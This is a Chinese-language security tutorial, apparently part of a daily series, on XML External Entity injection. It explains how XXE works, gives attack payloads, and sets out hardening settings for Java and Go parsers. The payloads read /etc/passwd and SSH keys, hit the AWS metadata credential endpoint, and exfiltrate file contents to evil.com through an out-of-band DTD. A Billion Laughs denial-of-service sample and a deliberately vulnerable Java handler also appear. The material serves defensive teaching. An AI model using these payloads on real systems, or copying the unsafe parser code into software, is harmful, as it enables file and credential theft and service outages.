---
title: "Day 13 — XXE（XML External Entity Injection）：當 XML 解析器幫攻擊者「打開」你伺服器的檔案"
date: 2026-05-08
tags: ["Injection", "XXE", "XML"]
---

# Day 13 — XXE（XML External Entity Injection）：當 XML 解析器幫攻擊者「打開」你伺服器的檔案

> 日期：2026-05-08
> 適合對象：後端工程師初學者
> 主題難度：★★★★☆（觀念偏冷門，但只要你的服務碰到 XML、SOAP、SAML、SVG、docx/xlsx，就極可能踩到）

---

## 一、開場白：「我又不解析 XML」？你可能比想像中更常用 XML

很多人以為 XML 是十年前的東西，今天「都用 JSON 了」，所以這個主題跟自己無關。但你猜怎麼著，下列場景幾乎都偷偷藏著 XML 解析：

- 任何 SOAP 介接（金流、ERP、物流業者、政府開放資料）
- SAML 單一登入（SSO）→ Body 整段是 XML
- 設定檔（Spring 早期、Maven `pom.xml`、Tomcat `web.xml`）
- Office 檔案（`.docx`、`.xlsx`、`.pptx` 解壓縮後就是 XML）
- SVG 圖檔（你以為是圖片，其實是 XML）
- RSS/Atom Feed、KML、GPX
- Android 早期某些 API 回傳 XML
- 部分 banking、healthcare 系統至今仍用 XML 訊息

只要程式裡有「把使用者送來的 XML 字串丟進解析器」，並且使用「預設」的解析器設定，**幾乎都會中標**。XXE 是 OWASP Top 10 多年常客，從 2017 一路榜上有名（後來合併到 A05:2021 Security Misconfiguration）。

> **真實案例：**
> - **2018 年 Facebook**：某第三方檔案上傳元件解析 docx 時觸發 XXE，攻擊者讀到伺服器的 `/etc/passwd` 與 AWS metadata，獲得約 4 萬美金 bounty。
> - **2017 年 Apache Struts**：CVE-2017-9805，REST plugin 用 XStream 解析 XML 沒設定白名單，造成 RCE。
> - **2014 年 PayPal**：因為 SVG 上傳處理的 XXE，可讀取任意檔案。

---

## 二、先補課：什麼是 XML Entity？

XML 設計時就有「實體（Entity）」這個概念，用來宣告可重用的字串。最簡單的：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY greeting "Hello">
]>
<note>&greeting; world</note>
```

解析器看到 `&greeting;` 會把它替換成 `Hello`。OK，看起來像「巨集」。

但 XML 規範還允許「**外部實體（External Entity）**」——從外部來源載入內容：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<note>&xxe;</note>
```

當解析器看到 `&xxe;`，它會去**讀 `/etc/passwd` 的內容**並把它放進 XML 樹裡。這就是漏洞的核心：**攻擊者可以叫你的伺服器去讀任意檔案、發任意 HTTP 請求。**

---

## 三、最小化的攻擊範例

### 攻擊 Payload（讀本機檔案）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY pwn SYSTEM "file:///etc/passwd">
]>
<order>
  <buyer>&pwn;</buyer>
  <item>book</item>
</order>
```

如果後端把 `<buyer>` 的值印回去（例如錯誤訊息、確認頁、log），攻擊者就拿到 `/etc/passwd`。

### Java 版（最常見的犯罪現場）

```java
// ❌ 危險：DocumentBuilderFactory 預設「啟用」外部實體
@PostMapping(value = "/order", consumes = "application/xml")
public String order(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    String buyer = doc.getElementsByTagName("buyer").item(0).getTextContent();
    return "Hi " + buyer;
}
```

**重點：JDK 內建 `DocumentBuilderFactory`、`SAXParserFactory`、`XMLInputFactory`、`TransformerFactory`、`SchemaFactory`、`XPathFactory`，預設都會處理外部實體。** 這是歷史包袱，新版 JDK（17+）對 DTD 的預設值有比較收斂，但實際安不安全還是要看你怎麼設定。

### Go 版

Go 的好消息：**`encoding/xml` 標準函式庫不會展開外部實體**。它連 DTD 都會忽略，所以單純用 `xml.Unmarshal` 是安全的。

```go
// 標準函式庫使用 xml.Unmarshal — 不會處理 SYSTEM/PUBLIC 外部實體
type Order struct {
    Buyer string `xml:"buyer"`
    Item  string `xml:"item"`
}

func OrderHandler(w http.ResponseWriter, r *http.Request) {
    var o Order
    body, _ := io.ReadAll(r.Body)
    if err := xml.Unmarshal(body, &o); err != nil {
        http.Error(w, err.Error(), 400)
        return
    }
    fmt.Fprintf(w, "Hi %s", o.Buyer)
}
```

危險的是當你**改用第三方 XML 函式庫**（例如 `github.com/beevik/etree` 在處理 DTD、或是把 XML 餵進 libxml2 的 binding）時，就要再次確認設定。Go 程式員真正會踩雷的，反而是「處理 SAML 或 SOAP 訊息」時引入的第三方解析器。

---

## 四、XXE 能做到什麼？

### 1. 讀取本機檔案（File Disclosure）

如同上面例子。除了 `/etc/passwd`，攻擊者更愛讀的有：

```
file:///root/.ssh/id_rsa
file:///proc/self/environ          # 環境變數，通常含 DB_PASSWORD、API_KEY
file:///var/lib/secrets/*
file:///app/application.yml         # Spring Boot 設定
```

### 2. SSRF（伺服器端請求偽造）

把 `SYSTEM` URL 換成 `http://` 就變成 SSRF：

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

對，這就是 Day 10 的 SSRF。XXE 是 SSRF 的一種「進入點」。AWS metadata 服務、內網管理介面、本機 Redis（`http://127.0.0.1:6379/`）全都是攻擊目標。

### 3. Blind XXE（看不到回傳結果時）

如果伺服器不會把解析後的內容印回來，攻擊者改用「外部 DTD + 帶外通道（OOB）」：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % ext SYSTEM "http://evil.com/evil.dtd">
  %ext;
]>
<foo/>
```

`evil.dtd` 內容：

```
<!ENTITY % bait "<!ENTITY &#x25; payload SYSTEM 'http://evil.com/?x=%file;'>">
%bait;
%payload;
```

效果：解析器先讀 `/etc/passwd`，再把內容塞進一個 URL 發到攻擊者主機。**伺服器表面什麼都沒回，但檔案已經在攻擊者的 access log 裡。**

### 4. DoS — Billion Laughs Attack

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- 一直疊到 lol9 -->
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

`lol9` 展開後是 10⁹ 個 `lol`，3 GB 字串，瞬間吃光記憶體。

### 5. RCE（Remote Code Execution）

某些舊的 PHP 加上 `expect://` 包裝、或某些 Java XSLT 處理器（`Xalan`）可以呼叫 Java method，最壞情況直接 RCE。

---

## 五、防禦：怎麼正確設定 Java 的 XML 解析器？

OWASP 的標準解法是「**關閉所有 DTD 處理**」。以最常見的幾種解析器為例：

### 5-1. DocumentBuilderFactory（DOM）

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// ✅ 關掉 DTD（最有效的一招）
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 雙重保險：即使因相容性需要保留 DTD，也要關掉外部實體
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// 額外的安全旗標
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
```

### 5-2. SAXParserFactory（SAX）

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setXIncludeAware(false);
```

### 5-3. XMLInputFactory（StAX）

```java
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

### 5-4. TransformerFactory（XSLT）

```java
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

### 5-5. SchemaFactory（XSD 驗證）

```java
SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

### 5-6. JAXB（unmarshal）

JAXB 內部其實是用 SAX，所以你**真正要設定的是它使用的 SAX 解析器**，而不是 `Unmarshaller` 本身：

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

XMLReader xmlReader = spf.newSAXParser().getXMLReader();
SAXSource source = new SAXSource(xmlReader, new InputSource(reader));

JAXBContext ctx = JAXBContext.newInstance(Order.class);
Order order = (Order) ctx.createUnmarshaller().unmarshal(source);
```

### 5-7. 如果你只是「想拿到 XML 內某些欄位」

**用 Jackson XML（`jackson-dataformat-xml`）。** 它預設不啟用 DTD/外部實體，而且大部分情況你直接 `objectMapper.readValue(xml, Order.class)` 就好，比 JAXB 簡潔。

---

## 六、Go 的注意事項

Go 的 `encoding/xml` 預設安全。但有幾個地雷：

1. **不要 `xml.Unmarshal` 後再「原樣回印 XML」**——攻擊者可以送進帶有奇怪命名空間或非 ASCII 字元的 XML 來繞過驗證。建議解出來後再用 `xml.Marshal` 重新編一次。
2. **第三方解析器要查文件**：`github.com/lestrrat-go/libxml2` 直接綁 libxml2，預設行為跟 C 版本一樣會展開外部實體；`github.com/antchfx/xmlquery` 內部用 `encoding/xml`，相對安全。
3. **SAML / SOAP 用什麼套件**：例如 `github.com/crewjam/saml`、`github.com/russellhaering/gosaml2`，要確認版本、看 release notes 有沒有修過 XXE。**用 `context7` 之類的 MCP 查一下這些套件還在不在維護，是個好習慣。**

---

## 七、防禦清單（後端工程師檢查表）

1. [ ] **預設關閉 DTD**：所有 XML 解析器都加上 `disallow-doctype-decl=true`。
2. [ ] **不要自己寫 XML 解析包裝**，把上面五種設定包成共用函式（例如 `SafeXmlFactory.newDocumentBuilder()`），全公司強制使用。
3. [ ] **SAML / SOAP 套件選有人在維護的**，每季升級。
4. [ ] **檔案上傳要先看內容**：docx、xlsx、svg 解壓縮後是 XML，**不要把使用者上傳檔案丟進預設的解析器**。
5. [ ] **錯誤訊息不要原樣回印 XML**：避免 Reflective XXE。
6. [ ] **網路出口控制**：即使 XXE 可以 `http://` 出去，把 production server 的 outbound 限制在白名單，能擋掉 SSRF + Blind XXE。和 Day 10 SSRF 那一套防線完全可以共用。
7. [ ] **資源限制**：對 XML 解析器設定 entity 展開上限（JDK 9+ 內建 `jdk.xml.entityExpansionLimit`，預設 64000；你可以設更小）。
8. [ ] **CI 加靜態掃描**：SpotBugs + Find Security Bugs（Java）、`govulncheck`（Go）、Snyk / Semgrep 都能標出有風險的 XML 解析寫法。

---

## 八、一頁速記（給 Code Review 用）

看到下列關鍵字，請停下來檢查設定：

```
DocumentBuilderFactory        SAXParserFactory
XMLInputFactory               TransformerFactory
SchemaFactory                 SAXReader（dom4j）
SAXBuilder（jdom2）           Unmarshaller（JAXB）
XStream                       XMLDecoder（極危險，連反序列化都中）
```

下面任何一個出現，幾乎就是 XXE 紅燈：

```
SYSTEM "file:..."
SYSTEM "http:..."
<!ENTITY ...>
<!DOCTYPE ...>
```

---

## 九、總結

XXE 不是「炫技」型漏洞，它的根因樸素到讓人發毛——**XML 規範允許外部實體，而 Java 多數解析器預設啟用它**。攻擊者只要送一段 XML 就能：

- 讀你的設定檔、私鑰、雲端憑證
- 從你的伺服器發 HTTP 請求到內網
- 一次癱瘓你的服務（Billion Laughs）

防禦核心只有兩個字：**「關掉」**。關掉 DTD、關掉外部實體、關掉外部 schema/XSL。其餘是維運層的縱深防禦。

下一篇（Day 14）我們會聊 **Insecure Deserialization（不安全的反序列化）**。Java 的 `ObjectInputStream`、`XStream`、`Jackson polymorphic typing` 都是高風險地雷區，Spring Boot 預設情境下也可能踩到。明天見。

---

## 延伸閱讀

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — XXE](https://portswigger.net/web-security/xxe)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
